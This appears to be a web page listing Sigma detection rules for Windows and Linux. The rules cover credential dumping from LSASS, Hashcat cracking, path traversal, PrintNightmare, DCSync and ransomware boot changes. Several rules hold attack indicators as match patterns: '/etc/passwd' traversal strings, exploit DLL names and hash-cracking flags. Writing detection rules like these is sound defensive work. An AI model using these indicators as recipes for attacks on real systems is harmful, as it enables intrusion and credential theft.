<li><a href="#">title:Password Change on Directory Service Restore Mode (DSRM) Account id: 53ad8e36-f573-46bf-97e4-15ba5bf4bb51 status: stable description: The Directory Service Restore Mode (DSRM) account is a local administrator account on Domain Controllers. Attackers may change the password to gain persistence. references: - author: Thomas Patzke date: 2017/02/19 modified: 2020/08/23 tags: - attack.persistence - attack.t1098 logsource: product: windows service: security detection: selection: EventID: 4794 condition: selection falsepositives: - Initial installation of a domain controller level: high 
<li><a href="#">title:Password Cracking with Hashcat id: 39b31e81-5f5f-4898-9c0e-2160cfc0f9bf status: experimental description: Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against references: - - author: frack113 date: 2021/12/27 modified: 2022/03/30 logsource: category: process_creation product: windows detection: hashcat_basic: Image|endswith: '\hashcat.exe' hashcat_option: CommandLine|contains|all: - '-a ' - '-m 1000 ' - '-r ' condition: 1 of hashcat_* falsepositives: - Tools that accidentally use the same command line flags and values level: high tags: - attack.credential_access - attack.t1110.002 
<li><a href="#">title:Password Dumper Activity on LSASS id: aa1697b7-d611-4f9a-9cb2-5125b4ccfd5c description: Detects process handle on LSASS process with certain access mask and object type SAM_DOMAIN status: experimental author: sigma date: 2017/02/12 modified: 2021/06/21 references: - tags: - attack.credential_access - attack.t1003.001 logsource: product: windows service: security detection: selection: EventID: 4656 ProcessName|endswith: '\lsass.exe' AccessMask: '0x705' ObjectType: 'SAM_DOMAIN' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Password Dumper Remote Thread in LSASS id: f239b326-2f41-4d6b-9dfa-c846a60ef505 description: Detects password dumper activity by monitoring remote thread creation EventID 8 in combination with the lsass.exe process as TargetImage. The process in field Process is the malicious program. A single execution can lead to hundreds of events. references: - status: stable author: Thomas Patzke date: 2017/02/19 modified: 2021/06/21 logsource: product: windows category: create_remote_thread detection: selection: TargetImage|endswith: '\lsass.exe' StartModule: '' condition: selection tags: - attack.credential_access - attack.s0005 - attack.t1003.001 falsepositives: - Antivirus products level: high 
<li><a href="#">title:Password Policy Discovery id: ca94a6db-8106-4737-9ed2-3e3bb826af0a status: stable description: Detects password policy discovery commands author: Ã–mer GÃ¼nal, oscd.community, Pawel Mazur date: 2020/10/08 modified: 2021/11/12 references: - - - - - logsource: product: linux service: auditd detection: files: type: 'PATH' name: - '/etc/pam.d/common-password' - '/etc/security/pwquality.conf' - '/etc/pam.d/system-auth' - '/etc/login.defs' chage: type: 'EXECVE' a0: 'chage' a1: - '--list' - '-l' passwd: type: 'EXECVE' a0: 'passwd' a1: - '-S' - '--status' condition: files or chage or passwd falsepositives: - Legitimate administration activities level: low tags: - attack.discovery - attack.t1201 
<li><a href="#">title:Password Policy Discovery With Get-AdDefaultDomainPasswordPolicy id: bbb9495b-58fc-4016-b9df-9a3a1b67ca82 status: experimental description: Detetcts PowerShell activity in which Get-Addefaultdomainpasswordpolicy is used to get the default password policy for an Active Directory domain. date: 2022/03/17 author: frack113 references: - - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: Get-AdDefaultDomainPasswordPolicy condition: selection falsepositives: - Legitimate PowerShell scripts level: low tags: - attack.discovery - attack.t1201 
<li><a href="#">title:Password Protected ZIP File Opened (Email Attachment) id: 571498c8-908e-40b4-910b-d2369159a3da status: experimental description: Detects the extraction of password protected ZIP archives. See the filename variable for more details on which file has been opened. references: - author: Florian Roth date: 2022/05/09 logsource: product: windows service: security detection: selection: EventID: 5379 TargetName|contains|all: - 'Microsoft_Windows_Shell_ZipFolder:filename' - '\Temporary Internet Files\Content.Outlook' condition: selection falsepositives: - Legitimate used of encrypted ZIP files level: high 
<li><a href="#">title:Password Protected ZIP File Opened (Suspicious Filenames) id: 54f0434b-726f-48a1-b2aa-067df14516e4 status: experimental description: Detects the extraction of password protected ZIP archives with suspicious file names. See the filename variable for more details on which file has been opened. references: - author: Florian Roth date: 2022/05/09 logsource: product: windows service: security detection: selection: EventID: 5379 TargetName|contains: 'Microsoft_Windows_Shell_ZipFolder:filename' selection_filename: TargetName|contains: - 'invoice' - 'new order' - 'rechnung' - 'factura' - 'delivery' - 'purchase' - 'order' - 'payment' condition: selection and selection_filename falsepositives: - Legitimate used of encrypted ZIP files level: high 
<li><a href="#">title:Password Protected ZIP File Opened id: 00ba9da1-b510-4f6b-b258-8d338836180f status: experimental description: Detects the extraction of password protected ZIP archives. See the filename variable for more details on which file has been opened. references: - author: Florian Roth date: 2022/05/09 logsource: product: windows service: security detection: selection: EventID: 5379 TargetName|contains: 'Microsoft_Windows_Shell_ZipFolder:filename' filter: # avoid overlaps with 54f0434b-726f-48a1-b2aa-067df14516e4 TargetName|contains: '\Temporary Internet Files\Content.Outlook' condition: selection and not filter falsepositives: - Legitimate used of encrypted ZIP files level: medium 
<li><a href="#">title:Password Provided In Command Line Of Net.exe id: d4498716-1d52-438f-8084-4a603157d131 status: experimental description: Detects a when net.exe is called with a password in the command line references: - Internal Research author: Tim Shelton (HAWK.IO) date: 2021/12/09 logsource: category: process_creation product: windows detection: selection1: Image: C:\Windows\System32\net.exe selection2: CommandLine|contains|all: - 'net' - ' use ' - ':*\\' - '/USER:* *' filter: CommandLine|endswith: ' ' condition: all of selection* and not 1 of filter* falsepositives: - Unknown level: medium 
<li><a href="#">title:Password Spraying Attempts Using Dsacls id: bac9fb54-2da7-44e9-988f-11e9a5edbc0c status: experimental description: Detects possible password spraying attempts using Dsacls author: Nasreddine Bencherchali references: - - - (v=ws.11) date: 2022/06/20 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\dsacls.exe' - OriginalFileName: "DSACLS.EXE" selection_cli: CommandLine|contains|all: - '/user:' - '/passwd:' condition: all of selection* falsepositives: - Legitimate use of dsacls to bind to an LDAP session level: medium tags: - attack.execution - attack.t1218 
<li><a href="#">title:Path To Screensaver Binary Modified id: 67a6c006-3fbe-46a7-9074-2ba3b82c3000 status: test description: Detects value modification of registry key containing path to binary used as screensaver. author: Bartlomiej Czyz @bczyz1, oscd.community references: - - date: 2020/10/11 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: TargetObject|endswith: '\Control Panel\Desktop\SCRNSAVE.EXE' # HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE filter: Image|endswith: - '\rundll32.exe' - '\explorer.exe' condition: selection and not filter falsepositives: - Legitimate modification of screensaver level: medium tags: - attack.persistence - attack.privilege_escalation - attack.t1546.002 
<li><a href="#">title:Path Traversal Exploitation Attempts id: 7745c2ea-24a5-4290-b680-04359cb84b35 author: Subhash Popuri (@pbssubhash), Florian Roth (generalisation) date: 2021/09/25 status: experimental description: Detects path traversal exploitation attempts references: - logsource: category: webserver detection: selection: c-uri|contains: - '../../../../../etc/passwd' - '../../../../windows/' - '../../../../../lib/password' condition: selection falsepositives: - Happens all the time on systems exposed to the Internet - Internal vulnerability scanners tags: - attack.initial_access - attack.t1190 level: medium 
<li><a href="#">title:PCRE.NET Package Image Load id: 84b0a8f3-680b-4096-a45b-e9a89221727c description: Detects processes loading modules related to PCRE.NET package status: experimental date: 2020/10/29 modified: 2021/08/14 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.execution - attack.t1059 references: - - logsource: category: image_load product: windows detection: selection: ImageLoaded|contains: \AppData\Local\Temp\ba9ea7344a4a5f591d6e5dc32a13494b\ condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:PCRE.NET Package Temp Files id: 6e90ae7a-7cd3-473f-a035-4ebb72d961da description: Detects processes creating temp files related to PCRE.NET package status: experimental date: 2020/10/29 modified: 2021/08/14 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.execution - attack.t1059 references: - - logsource: category: file_event product: windows detection: selection: TargetFilename|contains: \AppData\Local\Temp\ba9ea7344a4a5f591d6e5dc32a13494b\ condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Persistence and Execution at Scale via GPO Scheduled Task id: a8f29a7b-b137-4446-80a0-b804272f3da2 status: test description: Detect lateral movement using GPO scheduled task, usually used to deploy ransomware at scale author: Samir Bousseaden references: - - date: 2019/04/03 modified: 2021/11/27 logsource: product: windows service: security definition: 'The advanced audit policy setting "Object Access > Audit Detailed File Share" must be configured for Success/Failure' detection: selection: EventID: 5145 ShareName: \\\*\SYSVOL RelativeTargetName|endswith: 'ScheduledTasks.xml' Accesses|contains: - 'WriteData' - '%%4417' condition: selection falsepositives: - If the source IP is not localhost then it's super suspicious, better to monitor both local and remote changes to GPO scheduledtasks level: high tags: - attack.persistence - attack.lateral_movement - attack.t1053.005 
<li><a href="#">title:Persistence Via Notepad++ Plugins id: 54127bd4-f541-4ac3-afdb-ea073f63f692 description: Detects creation of new ".dll" files inside the plugins directory of a notepad++ installation by a process other than "gup.exe". Which could indicates possible persistence status: experimental author: Nasreddine Bencherchali references: - date: 2022/06/10 modified: 2022/06/21 logsource: product: windows category: file_event detection: selection: TargetFilename|contains: '\Notepad++\plugins\' TargetFilename|endswith: '.dll' filter_gup: Image|endswith: '\Notepad++\updater\gup.exe' filter_install: # This filter is for Sigma dataset you could remove it or change when using the rule in your own env Image|startswith: 'C:\Users\' Image|contains: '\AppData\Local\Temp\' Image|endswith: '\target.exe' condition: selection and not 1 of filter* falsepositives: - Possible FPs during first installation of Notepad++ - Legitimate use of custom plugins to enhance notepad++ functionality by users level: medium tags: - attack.persistence 
<li><a href="#">title:Persistent Outlook Landing Pages id: 487bb375-12ef-41f6-baae-c6a1572b4dd1 description: Detects the manipulation of persistent URLs which could execute malicious code status: experimental references: - author: Tobias Michalski date: 2021/06/10 modified: 2022/06/26 logsource: product: windows category: registry_set detection: selection1: EventType: SetValue TargetObject|contains: - 'Software\Microsoft\Office\' - '\Outlook\Today\' selectionStamp: TargetObject|endswith: Stamp Details: DWORD (0x00000001) selectionUserDefined: TargetObject|endswith: UserDefinedUrl filter_office: Image|startswith: - 'C:\Program Files\Common Files\Microsoft Shared\ClickToRun\' - 'C:\Program Files\Common Files\Microsoft Shared\ClickToRun\Updates\' Image|endswith: '\OfficeClickToRun.exe' condition: selection1 and (selectionStamp or selectionUserDefined) and not 1 of filter_* fields: - Details falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1112 
<li><a href="#">title:Persistent Outlook Landing Pages id: ddd171b5-2cc6-4975-9e78-f0eccd08cc76 description: Detects the manipulation of persistent URLs which can be malicious status: experimental references: - - author: Tobias Michalski date: 2021/06/09 modified: 2022/06/26 logsource: product: windows category: registry_set detection: selection_1: EventType: SetValue TargetObject|contains: - '\Software\Microsoft\Office\' - '\Outlook\WebView\' TargetObject|endswith: '\URL' selection_2: TargetObject|contains: - '\Calendar\' - '\Inbox\' condition: all of selection_* fields: - Details falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1112 
<li><a href="#">title:PetitPotam Suspicious Kerberos TGT Request id: 6a53d871-682d-40b6-83e0-b7c1a6c4e3a5 description: Detect suspicious Kerberos TGT requests. Once an attacer obtains a computer certificate by abusing Active Directory Certificate Services in combination with PetitPotam, the next step would be to leverage the certificate for malicious purposes. One way of doing this is to request a Kerberos Ticket Granting Ticket using a tool like Rubeus. This request will generate a 4768 event with some unusual fields depending on the environment. This analytic will require tuning, we recommend filtering Account_Name to the Domain Controller computer accounts. status: experimental author: Mauricio Velazco, Michael Haag date: 2021/09/02 modified: 2021/09/07 references: - - - tags: - attack.credential_access - attack.t1187 logsource: product: windows service: security definition: 'The advanced audit policy setting "Account Logon > Kerberos Authentication Service" must be configured for Success/Failure' detection: selection: EventID: 4768 TargetUserName|endswith: '$' CertThumbprint: '*' filter_local: IpAddress: '::1' filter_thumbprint: CertThumbprint: '' condition: selection and not 1 of filter_* falsepositives: - False positives are possible if the environment is using certificates for authentication. We recommend filtering Account_Name to the Domain Controller computer accounts. level: high 
<li><a href="#">title:Phishing Pattern ISO in Archive id: fcdf69e5-a3d3-452a-9724-26f2308bf2b1 status: experimental description: Detects cases in which an ISO files is opend within an archiver like 7Zip or Winrar, which is open a signa of phishing as threat actors put small ISO files in archives as email attachments to bypass certain filters and protective measures (mark of web) author: Florian Roth references: - - date: 2022/06/07 tags: - attack.initial_access - attack.t1566 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: - '\Winrar.exe' - '\7zFM.exe' - '\peazip.exe' Image|endswith: - '\isoburn.exe' - '\PowerISO.exe' - '\ImgBurn.exe' condition: selection falsepositives: - Legitimate cases in which archives contain ISO or IMG files and the user opens the archive and the image via clicking and not extraction level: high 
<li><a href="#">title:Ping Hex IP id: 1a0d4aba-7668-4365-9ce4-6d79ab088dfd status: test description: Detects a ping command that uses a hex encoded IP address author: Florian Roth references: - - date: 2018/03/23 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\ping.exe' CommandLine|contains: '0x' condition: selection fields: - ParentCommandLine falsepositives: - Unlikely, because no sane admin pings IP addresses in a hexadecimal form level: high tags: - attack.defense_evasion - attack.t1140 - attack.t1027 
<li><a href="#">title:Pingback Backdoor id: 2bd63d53-84d4-4210-80ff-bf0658f1bf78 status: experimental description: Detects the use of Pingback backdoor that creates ICMP tunnel for C2 as described in the trustwave report author: Bhabesh Raj date: 2021/05/05 modified: 2021/09/09 references: - - tags: - attack.persistence - attack.t1574.001 logsource: product: windows category: file_event detection: selection: Image|endswith: updata.exe TargetFilename: 'C:\Windows\oci.dll' condition: selection falsepositives: - Very unlikely level: high 
<li><a href="#">title:Pingback Backdoor id: 35a7dc42-bc6f-46e0-9f83-81f8e56c8d4b status: experimental description: Detects the use of Pingback backdoor that creates ICMP tunnel for C2 as described in the trustwave report author: Bhabesh Raj date: 2021/05/05 modified: 2021/09/09 references: - - tags: - attack.persistence - attack.t1574.001 logsource: product: windows category: image_load detection: selection: Image|endswith: 'msdtc.exe' ImageLoaded: 'C:\Windows\oci.dll' condition: selection falsepositives: - Very unlikely level: high 
<li><a href="#">title:Pingback Backdoor id: b2400ffb-7680-47c0-b08a-098a7de7e7a9 status: experimental description: Detects the use of Pingback backdoor that creates ICMP tunnel for C2 as described in the trustwave report author: Bhabesh Raj date: 2021/05/05 modified: 2021/09/09 references: - - tags: - attack.persistence - attack.t1574.001 logsource: product: windows category: process_creation detection: selection: ParentImage|endswith: 'updata.exe' CommandLine|contains|all: - 'config' - 'msdtc' - 'start' - 'auto' condition: selection falsepositives: - Very unlikely level: high 
<li><a href="#">title:PortProxy Registry Key id: a54f842a-3713-4b45-8c84-5f136fdebd3c status: experimental description: Detects the modification of PortProxy registry key which is used for port forwarding. For command execution see rule win_netsh_port_fwd.yml. references: - - - date: 2021/06/22 modified: 2021/09/13 tags: - attack.lateral_movement - attack.defense_evasion - attack.command_and_control - attack.t1090 author: Andreas Hunkeler (@Karneades) logsource: category: registry_event product: windows detection: selection_registry: TargetObject: 'HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp' condition: selection_registry falsepositives: - WSL2 network bridge PowerShell script used for WSL/Kubernetes/Docker (e.g. ) - Synergy Software KVM () level: medium 
<li><a href="#">title:Possible App Whitelisting Bypass via WinDbg/CDB as a Shellcode Runner id: b5c7395f-e501-4a08-94d4-57fe7a9da9d2 status: test description: Launch 64-bit shellcode from a debugger script file using cdb.exe. author: Beyu Denis, oscd.community, Nasreddine Bencherchali references: - - - date: 2019/10/26 modified: 2022/06/09 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\cdb.exe' - OriginalFileName: 'CDB.Exe' selection_cli: CommandLine|contains: - ' -c ' # Using a debugger script - ' -cf ' condition: all of selection* falsepositives: - Legitimate use of debugging tools level: medium tags: - attack.execution - attack.t1106 - attack.defense_evasion - attack.t1218 - attack.t1127 
<li><a href="#">title:Possible Applocker Bypass id: 82a19e3a-2bfe-4a91-8c0d-5d4c98fbb719 status: test description: Detects execution of executables that can be used to bypass Applocker whitelisting author: juju4 references: - - - date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - '\msdt.exe' - '\installutil.exe' - '\regsvcs.exe' - '\regasm.exe' # - '\regsvr32.exe' # too many FPs, very noisy - '\msbuild.exe' - '\ieexec.exe' #- '\mshta.exe' #- '\csc.exe' condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment - Using installutil to add features for .NET applications (primarily would occur in developer environments) level: low tags: - attack.defense_evasion - attack.t1218.004 - attack.t1218.009 - attack.t1127.001 - attack.t1218.005 - attack.t1218 # no way to map 1:1, so the technique level is required 
<li><a href="#">title:Possible Coin Miner CPU Priority Param id: 071d5e5a-9cef-47ec-bc4e-a42e34d8d0ed status: experimental description: Detects command line parameter very often used with coin miners author: Florian Roth date: 2021/10/09 references: - tags: - attack.privilege_escalation - attack.t1068 logsource: product: linux service: auditd detection: cmd1: a1|startswith: '--cpu-priority' cmd2: a2|startswith: '--cpu-priority' cmd3: a3|startswith: '--cpu-priority' cmd4: a4|startswith: '--cpu-priority' cmd5: a5|startswith: '--cpu-priority' cmd6: a6|startswith: '--cpu-priority' cmd7: a7|startswith: '--cpu-priority' condition: 1 of cmd* falsepositives: - Other tools that use a --cpu-priority flag level: critical 
<li><a href="#">title:Possible CVE-2021-1675 Print Spooler Exploitation id: 4e64668a-4da1-49f5-a8df-9e2d5b866718 description: Detects events of driver load errors in print service logs that could be a sign of successful exploitation attempts of print spooler vulnerability CVE-2021-1675 author: Florian Roth, KevTheHermit, fuzzyf10w, Tim Shelton status: experimental level: high references: - - - date: 2021/06/30 modified: 2022/06/22 tags: - attack.execution - attack.t1569 - cve.2021.1675 logsource: product: windows service: printservice-admin detection: selection: EventID: - 808 # old id - 4909 # new id ErrorCode: - '0x45A' - '0x7e' keywords: - 'The print spooler failed to load a plug-in module' # default file names used in PoC codes - 'MyExploit.dll' - 'evil.dll' - '\addCube.dll' - '\rev.dll' - '\rev2.dll' - '\main64.dll' - '\mimilib.dll' - '\mimispool.dll' falsepositive: - ' registration timed out' # ex: The print spooler failed to load a plug-in module PrintConfig registration timed out condition: (selection or keywords) and not falsepositive fields: - PluginDllName falsepositives: - Problems with printer drivers 
<li><a href="#">title:Possible DC Shadow id: 32e19d25-4aed-4860-a55a-be99cb0bf7ed description: Detects DCShadow via create new SPN status: experimental author: Ilyas Ochkov, oscd.community, Chakib Gzenayi (@Chak092), Hosni Mribah date: 2019/10/25 modified: 2021/07/06 references: - - - - tags: - attack.credential_access - attack.t1207 logsource: product: windows service: security detection: selection1: EventID: 4742 ServicePrincipalNames|contains: 'GC/' selection2: EventID: 5136 AttributeLDAPDisplayName: servicePrincipalName AttributeValue|startswith: 'GC/' condition: selection1 or selection2 falsepositives: - Exclude known DCs level: high 
<li><a href="#">title:Possible DCSync Attack id: 56fda488-113e-4ce9-8076-afc2457922c3 description: Detects remote RPC calls to MS-DRSR from non DC hosts, which could indicate DCSync / DCShadow attacks. references: - - - - - tags: - attack.t1033 status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: 'Requirements: install and apply the RPC Firewall to all processes, enable DRSR UUID (e3514235-4b06-11d1-ab04-00c04fc2dcd2) for "dangerous" opcodes (not 0,1 or 12) only from trusted IPs (DCs)' detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: e3514235-4b06-11d1-ab04-00c04fc2dcd2 filter: OpNum: - 0 - 1 - 12 condition: selection and not filter falsepositives: - Unknown level: high 
<li><a href="#">title:Possible DNS Rebinding id: eb07e747-2552-44cd-af36-b659ae0958e4 status: test description: Detects several different DNS-answers by one domain with IPs from internal and external networks. Normally, DNS-answer contain TTL >100. (DNS-record will saved in host cache for a while TTL). author: Ilyas Ochkov, oscd.community references: - date: 2019/10/25 modified: 2021/11/27 logsource: product: windows category: dns_query detection: dns_answer: QueryName: '*' QueryStatus: '0' filter_int_ip: QueryResults|startswith: - '(::ffff:)?10.' - '(::ffff:)?192.168.' - '(::ffff:)?172.16.' - '(::ffff:)?172.17.' - '(::ffff:)?172.18.' - '(::ffff:)?172.19.' - '(::ffff:)?172.20.' - '(::ffff:)?172.21.' - '(::ffff:)?172.22.' - '(::ffff:)?172.23.' - '(::ffff:)?172.24.' - '(::ffff:)?172.25.' - '(::ffff:)?172.26.' - '(::ffff:)?172.27.' - '(::ffff:)?172.28.' - '(::ffff:)?172.29.' - '(::ffff:)?172.30.' - '(::ffff:)?172.31.' - '(::ffff:)?127.' timeframe: 30s condition: (dns_answer and filter_int_ip) and (dns_answer and not filter_int_ip) level: medium tags: - attack.initial_access - attack.t1189 
<li><a href="#">title:Possible DNS Tunneling id: 1ec4b281-aa65-46a2-bdae-5fd830ed914e status: test description: Normally, DNS logs contain a limited amount of different dns queries for a single domain. This rule detects a high amount of queries for a single domain, which can be an indicator that DNS is used to transfer data. author: Patrick Bareiss references: - - date: 2019/04/07 modified: 2021/11/27 logsource: category: dns detection: selection: parent_domain: '*' condition: selection falsepositives: - Valid software, which uses dns for transferring data level: high tags: - attack.command_and_control - attack.t1071.004 - attack.exfiltration - attack.t1048.003 
<li><a href="#">title:Possible Exploitation of Exchange RCE CVE-2021-42321 id: c92f1896-d1d2-43c3-92d5-7a5b35c217bb status: experimental description: Detects log entries that appear in exploitation attempts against MS Exchange RCE CVE-2021-42321 references: - author: 'Florian Roth, @testanull' date: 2021/11/18 logsource: product: windows service: msexchange-management detection: selection: EventID: - 6 - 8 keywords: - 'Cmdlet failed. Cmdlet Get-App, ' - 'Task Get-App throwing unhandled exception: System.InvalidCastException:' condition: selection and keywords falsepositives: - Unknown, please report false positives via level: high tags: - attack.lateral_movement - attack.t1210 
<li><a href="#">title:Possible Impacket SecretDump Remote Activity - Zeek id: 92dae1ed-1c9d-4eff-a567-33acbd95b00e status: test description: 'Detect AD credential dumping using impacket secretdump HKTL. Based on the SIGMA rules/windows/builtin/win_impacket_secretdump.yml' author: 'Samir Bousseaden, @neu5ron' references: - date: 2020/03/19 modified: 2021/11/27 logsource: product: zeek service: smb_files detection: selection: path|contains|all: - '\' - 'ADMIN$' name|contains: 'SYSTEM32\' name|endswith: '.tmp' condition: selection falsepositives: - Unknown level: high tags: - attack.credential_access - attack.t1003.002 - attack.t1003.004 - attack.t1003.003 
<li><a href="#">title:Possible Impacket SecretDump Remote Activity id: 252902e3-5830-4cf6-bf21-c22083dfd5cf description: Detect AD credential dumping using impacket secretdump HKTL status: experimental author: Samir Bousseaden, wagga date: 2019/04/03 modified: 2021/06/27 references: - tags: - attack.credential_access - attack.t1003.002 - attack.t1003.004 - attack.t1003.003 logsource: product: windows service: security definition: 'The advanced audit policy setting "Object Access > Audit Detailed File Share" must be configured for Success/Failure' detection: selection: EventID: 5145 ShareName: \\\*\ADMIN$ RelativeTargetName|contains|all: - 'SYSTEM32\' - '.tmp' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Possible InstallerFileTakeOver LPE CVE-2021-41379 id: af8bbce4-f751-46b4-8d91-82a33a736f61 status: experimental description: Detects signs of the exploitation of LPE CVE-2021-41379 to spawn a cmd.exe with LOCAL_SYSTEM rights author: Florian Roth date: 2021/11/22 references: - - tags: - attack.privilege_escalation - attack.t1068 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\cmd.exe' ParentImage|endswith: '\elevation_service.exe' IntegrityLevel: 'System' condition: selection falsepositives: - Unknown level: critical 
<li><a href="#">title:Possible PetitPotam Coerce Authentication Attempt id: 1ce8c8a3-2723-48ed-8246-906ac91061a6 description: Detect PetitPotam coerced authentication activity. status: experimental author: Mauricio Velazco, Michael Haag date: 2021/09/02 references: - - tags: - attack.credential_access - attack.t1187 logsource: product: windows service: security definition: 'The advanced audit policy setting "Object Access > Detailed File Share" must be configured for Success/Failure' detection: selection: EventID: 5145 ShareName|startswith: '\\' ShareName|endswith: '\IPC$' RelativeTargetName: lsarpc SubjectUserName: ANONYMOUS LOGON condition: selection falsepositives: - Unknown. Feedback welcomed. level: high 
<li><a href="#">title:Possible PrintNightmare Print Driver Install id: 7b33baef-2a75-4ca3-9da4-34f9a15382d8 description: | Detects the remote installation of a print driver which is possible indication of the exploitation of PrintNightmare (CVE-2021-1675). The occurrence of print drivers being installed remotely via RPC functions should be rare, as print drivers are normally installed locally and or through group policy. author: '@neu5ron (Nate Guagenti)' date: 2021/08/23 references: - - - - - - - tags: - attack.execution - cve.2021.1678 - cve.2021.1675 - cve.2021.34527 logsource: product: zeek service: dce_rpc detection: selection: operation: - 'RpcAsyncInstallPrinterDriverFromPackage' # "76f03f96-cdfd-44fc-a22c-64950a001209",0x3e - 'RpcAsyncAddPrintProcessor' # "76f03f96-cdfd-44fc-a22c-64950a001209",0x2c - 'RpcAddPrintProcessor' # "12345678-1234-abcd-ef00-0123456789ab",0x0e - 'RpcAddPrinterDriverEx' # "12345678-1234-abcd-ef00-0123456789ab",0x59 - 'RpcAddPrinterDriver' # "12345678-1234-abcd-ef00-0123456789ab",0x09 - 'RpcAsyncAddPrinterDriver' # "76f03f96-cdfd-44fc-a22c-64950a001209",0x27 condition: selection falsepositives: - Legitimate remote alteration of a printer driver. level: medium fields: - id.orig_h - id.resp_h - id.resp_p - operation - endpoint - named_pipe - uid status: stable 
<li><a href="#">title:Possible Privilege Escalation via Service Permissions Weakness id: 0f9c21f1-6a73-4b0e-9809-cb562cb8d981 description: Detect modification of services configuration (ImagePath, FailureCommand and ServiceDLL) in registry by processes with Medium integrity level references: - - tags: - attack.privilege_escalation - attack.t1574.011 status: experimental author: Teymur Kheirkhabarov date: 2019/10/26 modified: 2021/09/15 logsource: product: windows category: process_creation detection: selection: IntegrityLevel: 'Medium' CommandLine|contains|all: - ControlSet - services CommandLine|contains: - \ImagePath - \FailureCommand - \ServiceDll condition: selection falsepositives: - Unknown level: high enrichment: - EN_0001_cache_sysmon_event_id_1_info # - EN_0003_enrich_other_sysmon_events_with_event_id_1_data # 
<li><a href="#">title:Possible Privilege Escalation via Weak Service Permissions id: d937b75f-a665-4480-88a5-2f20e9f9b22a status: test description: Detection of sc.exe utility spawning by user with Medium integrity level to change service ImagePath or FailureCommand author: Teymur Kheirkhabarov references: - - date: 2019/10/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: scbynonadmin: Image|endswith: '\sc.exe' IntegrityLevel: 'Medium' binpath: CommandLine|contains|all: - 'config' - 'binPath' failurecommand: CommandLine|contains|all: - 'failure' - 'command' condition: scbynonadmin and (binpath or failurecommand) falsepositives: - Unknown level: high tags: - attack.persistence - attack.defense_evasion - attack.privilege_escalation - attack.t1574.011 
<li><a href="#">title:Possible Process Hollowing Image Loading id: e32ce4f5-46c6-4c47-ba69-5de3c9193cd7 status: test description: Detects Loading of samlib.dll, WinSCard.dll from untypical process e.g. through process hollowing by Mimikatz author: Markus Neis references: - date: 2018/01/07 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: 'notepad' ImageLoaded|endswith: - 'samlib' - 'WinSCard' condition: selection falsepositives: - Very likely, needs more tuning level: high tags: - attack.defense_evasion - attack.t1574.002 
<li><a href="#">title:Possible Ransomware or Unauthorized MBR Modifications id: c9fbe8e9-119d-40a6-9b59-dd58a5d84429 status: experimental description: Detects, possibly, malicious unauthorized usage of bcdedit.exe references: - - author: '@neu5ron' date: 2019/02/07 modified: 2021/06/18 tags: - attack.defense_evasion - attack.t1070 - attack.persistence - attack.t1542.003 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\bcdedit.exe' CommandLine|contains: - 'delete' - 'deletevalue' - 'import' - 'safeboot' - 'network' condition: selection level: medium 
<li><a href="#">title:Possible Remote Password Change Through SAMR id: 7818b381-5eb1-4641-bea5-ef9e4cfb5951 status: test description: Detects a possible remote NTLM hash change through SAMR API SamiChangePasswordUser() or SamSetInformationUser(). "Audit User Account Management" in "Advanced Audit Policy Configuration" has to be enabled in your local security policy / GPO to see this events. author: Dimitrios Slamaris date: 2017/06/09 modified: 2021/11/27 logsource: product: windows service: security detection: samrpipe: EventID: 5145 RelativeTargetName: samr passwordchanged: EventID: 4738 passwordchanged_filter: PasswordLastSet: timeframe: 15s condition: ( passwordchanged and not passwordchanged_filter ) or samrpipe level: medium tags: - attack.credential_access - attack.t1212 
<li><a href="#">title:Possible Shim Database Persistence via sdbinst.exe id: 517490a7-115a-48c6-8862-1a481504d5a8 status: experimental description: Detects installation of a new shim using sdbinst.exe. A shim can be used to load malicious DLLs into applications. references: - tags: - attack.persistence - attack.privilege_escalation - attack.t1546.011 author: Markus Neis date: 2019/01/16 modified: 2021/08/14 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\sdbinst.exe' CommandLine|contains: '.sdb' filter: CommandLine|contains: 'iisexpressshim.sdb' # normal behaviour for IIS Express (e.g. ) condition: selection and not filter falsepositives: - Unknown level: high 
<li><a href="#">title:Possible SPN Enumeration id: 1eeed653-dbc8-4187-ad0c-eeebb20e6599 status: test description: Detects Service Principal Name Enumeration used for Kerberoasting author: Markus Neis, keepwatch references: - date: 2018/11/14 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_image: Image|endswith: '\setspn.exe' selection_desc: Description|contains|all: - 'Query or reset the computer' - 'SPN attribute' cmd: CommandLine|contains: '-q' condition: (selection_image or selection_desc) and cmd falsepositives: - Administrator Activity level: medium tags: - attack.credential_access - attack.t1558.003 
